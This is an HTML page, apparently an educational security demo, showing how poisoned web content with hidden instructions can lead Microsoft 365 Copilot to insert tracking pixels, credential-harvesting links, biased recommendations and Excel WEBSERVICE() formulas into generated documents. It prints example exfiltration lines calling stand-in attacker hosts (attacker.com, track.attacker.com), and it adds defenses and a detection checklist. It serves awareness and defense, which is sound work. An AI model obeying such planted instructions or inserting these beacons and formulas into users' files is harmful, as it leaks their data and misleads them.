@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft 365 Copilot Poisoning Demo</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 40px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        h1 { color: #333; border-bottom: 3px solid #0078d4; padding-bottom: 10px; }
+        .back-link { color: #0078d4; text-decoration: none; }
+        .back-link:hover { text-decoration: underline; }
+
+        .scenario {
+            background: #e3f2fd;
+            border-left: 4px solid #0078d4;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .flow-diagram {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 2px solid #dee2e6;
+        }
+
+        .flow-step {
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid #0078d4;
+            background: white;
+        }
+
+        .attack-example {
+            background: #ffebee;
+            border: 2px solid #e74c3c;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        .defense {
+            background: #e8f5e9;
+            border: 2px solid #4caf50;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        .demo-button {
+            display: inline-block;
+            background: #0078d4;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+
+        .demo-button:hover {
+            background: #005a9e;
+            transform: translateY(-2px);
+        }
+
+        .code-block {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            margin: 10px 0;
+        }
+
+        ul { line-height: 2; }
+
+        .impact {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .impact-card {
+            background: #fff3cd;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #ffc107;
+        }
+
+        .impact-card h4 {
+            margin-top: 0;
+            color: #856404;
+        }
+
+        .app-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .app-card {
+            background: #e3f2fd;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .app-icon {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="../" class="back-link">← Back to Home</a>
+
+        <h1>📊 Microsoft 365 Copilot Poisoning Demo</h1>
+
+        <div class="scenario">
+            <h2>The Attack Scenario</h2>
+            <p>Microsoft 365 Copilot (Word, Excel, PowerPoint, Outlook) performs web research to help create content. Unlike code-execution attacks, M365 Copilot can't run arbitrary code. Instead, attacks focus on:</p>
+            <ul>
+                <li><strong>Content Manipulation</strong> - Inserting biased or false information</li>
+                <li><strong>Tracking & Exfiltration</strong> - Image beacons, external references</li>
+                <li><strong>Link Injection</strong> - Malicious URLs disguised as resources</li>
+                <li><strong>Social Engineering</strong> - Phishing emails, malicious recommendations</li>
+            </ul>
+        </div>
+
+        <div class="flow-diagram">
+            <h3>Attack Flow: Document Generation</h3>
+            <div class="flow-step">
+                <strong>Step 1:</strong> User asks Copilot in Word<br>
+                <em>"Create a marketing strategy document for Q1 2024"</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 2:</strong> Copilot searches web for marketing content<br>
+                <em>Finds poisoned "2024 Marketing Strategy Guide"</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 3:</strong> Copilot reads hidden instructions<br>
+                <em>HTML comments tell it to include tracking links and recommend specific tools</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 4:</strong> Copilot generates document with poisoned content<br>
+                <em>Includes tracking pixels, biased recommendations, malicious links</em>
+            </div>
+            <div class="flow-step">
+                <strong>Step 5:</strong> User reviews, looks good, shares document<br>
+                <em>Professional content, doesn't notice external references</em>
+            </div>
+            <div class="flow-step" style="border-left-color: #e74c3c; background: #ffebee;">
+                <strong>Step 6:</strong> Data exfiltration begins<br>
+                <em>Document opens tracked, links clicked, spreadsheet data sent to attacker</em>
+            </div>
+        </div>
+
+        <h2>Affected M365 Applications</h2>
+
+        <div class="app-grid">
+            <div class="app-card">
+                <div class="app-icon">📝</div>
+                <h3>Word Copilot</h3>
+                <p>Inserts tracking images, malicious reference links in reports</p>
+            </div>
+            <div class="app-card">
+                <div class="app-icon">📊</div>
+                <h3>Excel Copilot</h3>
+                <p>Suggests WEBSERVICE() formulas to attacker endpoints</p>
+            </div>
+            <div class="app-card">
+                <div class="app-icon">🎯</div>
+                <h3>PowerPoint Copilot</h3>
+                <p>Adds slides with tracking pixels, resource links</p>
+            </div>
+            <div class="app-card">
+                <div class="app-icon">✉️</div>
+                <h3>Outlook Copilot</h3>
+                <p>Drafts phishing emails, credential harvesting links</p>
+            </div>
+        </div>
+
+        <h2>Live Example</h2>
+
+        <p>Click below to see a realistic poisoned marketing article that targets M365 Copilot:</p>
+
+        <a href="poisoned-marketing-article.html" class="demo-button">View Poisoned Marketing Article →</a>
+
+        <div class="attack-example">
+            <h3>Data Exfiltration Methods (No Code Execution)</h3>
+
+            <h4>1. Tracking Pixels in Documents</h4>
+            <div class="code-block">&lt;!-- Inserted into Word document by Copilot --&gt;
+&lt;img src="https://track.attacker.com/pixel?doc=UNIQUE_ID&user=EMAIL"&gt;</div>
+            <p><strong>Exfiltrates:</strong> When document opened, user email, company domain</p>
+
+            <h4>2. Malicious "Resource" Links</h4>
+            <div class="code-block">For more information, see:
+- [Industry Report](https://attacker.com/collect?topic=QUERY&company=TARGET)
+- [Best Practices](https://malicious.site/harvest?source=copilot)</div>
+            <p><strong>Exfiltrates:</strong> Research topics, company info, credentials when clicked</p>
+
+            <h4>3. External Data Connections (Excel)</h4>
+            <div class="code-block">=WEBSERVICE("https://attacker.com/api?data=" & A1 & "&company=" & B1)</div>
+            <p><strong>Exfiltrates:</strong> Spreadsheet data when formula recalculates</p>
+
+            <h4>4. Email Tracking (Outlook)</h4>
+            <div class="code-block">&lt;!-- In email signature --&gt;
+&lt;img src="https://track.email.io/open?id=UNIQUE_ID" height="1" width="1"&gt;</div>
+            <p><strong>Exfiltrates:</strong> Email opens, recipient info, click behavior</p>
+        </div>
+
+        <div class="impact">
+            <div class="impact-card">
+                <h4>Information Leakage</h4>
+                <p>Research topics reveal company strategy and project details</p>
+            </div>
+            <div class="impact-card">
+                <h4>Competitive Intelligence</h4>
+                <p>Tracking shows who reads documents, organization structure</p>
+            </div>
+            <div class="impact-card">
+                <h4>Credential Theft</h4>
+                <p>Malicious links harvest credentials disguised as "resources"</p>
+            </div>
+            <div class="impact-card">
+                <h4>Biased Decisions</h4>
+                <p>Poisoned recommendations favor attacker's products/competitors</p>
+            </div>
+        </div>
+
+        <h2>Example Attack: Marketing Document</h2>
+
+        <div class="flow-diagram" style="background: #ffebee;">
+            <p><strong>User Request:</strong> "Create a Q1 marketing strategy document"</p>
+
+            <p><strong>Copilot Action:</strong> Searches web → finds poisoned guide → reads instructions</p>
+
+            <p><strong>Generated Document Includes:</strong></p>
+            <ul>
+                <li>📸 Tracking image: <code>&lt;img src="https://track.metrics.io/pixel?doc=Q1_STRATEGY"&gt;</code></li>
+                <li>🔗 "Resource" link: <code>https://attacker.com/collect?company=TARGET</code></li>
+                <li>🎯 Biased recommendation: "Use MarketMetrics Pro (attacker's tool)"</li>
+                <li>📊 Excel formula: <code>=WEBSERVICE("https://attacker.com/data?...")</code></li>
+            </ul>
+
+            <p><strong>User Impact:</strong></p>
+            <ul>
+                <li>✗ Document looks professional, user shares with team</li>
+                <li>✗ Tracking pixel reveals who opened it, when, from where</li>
+                <li>✗ Link clicks harvest credentials from team members</li>
+                <li>✗ Company implements biased recommendations</li>
+                <li>✗ Spreadsheet formulas exfiltrate financial data</li>
+            </ul>
+
+            <p style="color: #e74c3c; font-weight: bold;">All achieved without executing any code - just poisoned content.</p>
+        </div>
+
+        <div class="defense">
+            <h3>🛡️ Defense Strategies</h3>
+
+            <h4>For M365 Administrators:</h4>
+            <ul>
+                <li><strong>Content Source Restrictions:</strong> Limit domains Copilot can access</li>
+                <li><strong>Block External Images:</strong> Disable auto-loading in documents</li>
+                <li><strong>Link Scanning:</strong> Check all URLs against threat intelligence</li>
+                <li><strong>External Data Blocking:</strong> Restrict WEBSERVICE() and external connections</li>
+                <li><strong>Output Monitoring:</strong> Log and flag suspicious Copilot content</li>
+            </ul>
+
+            <h4>For Users:</h4>
+            <ul>
+                <li><strong>Review All Content:</strong> Don't blindly trust Copilot output</li>
+                <li><strong>Remove External References:</strong> Delete tracking images before sharing</li>
+                <li><strong>Verify Links:</strong> Check URLs before clicking</li>
+                <li><strong>Check Sources:</strong> See where Copilot got information from</li>
+                <li><strong>Sanitize Before Sharing:</strong> Remove external content from sensitive docs</li>
+            </ul>
+        </div>
+
+        <h2>Detection Checklist</h2>
+
+        <h4>🚩 Red Flags in Copilot-Generated Content:</h4>
+        <ul>
+            <li>Excessive external links to unfamiliar domains</li>
+            <li>References to obscure tools or vendors</li>
+            <li>"Download" or "click here to verify" language</li>
+            <li>Embedded images from unknown domains</li>
+            <li>Excel formulas with WEBSERVICE() to external sites</li>
+            <li>Overly specific recommendations without explanation</li>
+            <li>Tracking parameters in URLs (?id=, ?user=, ?source=)</li>
+        </ul>
+
+        <h2>Key Differences from Code-Execution Attacks</h2>
+
+        <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
+            <tr style="background: #f8f9fa;">
+                <th style="padding: 10px; text-align: left; border: 1px solid #ddd;">Attack Vector</th>
+                <th style="padding: 10px; text-align: left; border: 1px solid #ddd;">Code Execution</th>
+                <th style="padding: 10px; text-align: left; border: 1px solid #ddd;">M365 Copilot</th>
+            </tr>
+            <tr>
+                <td style="padding: 10px; border: 1px solid #ddd;">Method</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Run malicious code</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Content manipulation</td>
+            </tr>
+            <tr>
+                <td style="padding: 10px; border: 1px solid #ddd;">Exfiltration</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Direct API calls</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Tracking pixels, links</td>
+            </tr>
+            <tr>
+                <td style="padding: 10px; border: 1px solid #ddd;">Detection</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Code analysis</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Content review</td>
+            </tr>
+            <tr>
+                <td style="padding: 10px; border: 1px solid #ddd;">Scale</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Per execution</td>
+                <td style="padding: 10px; border: 1px solid #ddd;">Per document shared</td>
+            </tr>
+        </table>
+
+        <h2>Key Takeaways</h2>
+
+        <ul>
+            <li>🎯 <strong>M365 Copilot can't execute code</strong> - but content attacks are still dangerous</li>
+            <li>📡 <strong>Exfiltration via documents</strong> - tracking pixels and external references</li>
+            <li>🔗 <strong>Social engineering at scale</strong> - AI amplifies attacker reach</li>
+            <li>👀 <strong>Always review Copilot output</strong> - check links, images, recommendations</li>
+            <li>🛡️ <strong>Multiple defense layers needed</strong> - technical controls + user awareness</li>
+        </ul>
+
+        <h2>Try the Demo</h2>
+
+        <a href="poisoned-marketing-article.html" class="demo-button">View Poisoned Marketing Article</a>
+        <a href="README.md" class="demo-button" style="background: #6c757d;">Read Full Documentation</a>
+
+        <div style="margin-top: 40px; padding-top: 20px; border-top: 2px solid #ddd;">
+            <a href="../" class="back-link">← Back to Home</a>
+        </div>
+    </div>
+</body>
+</html>
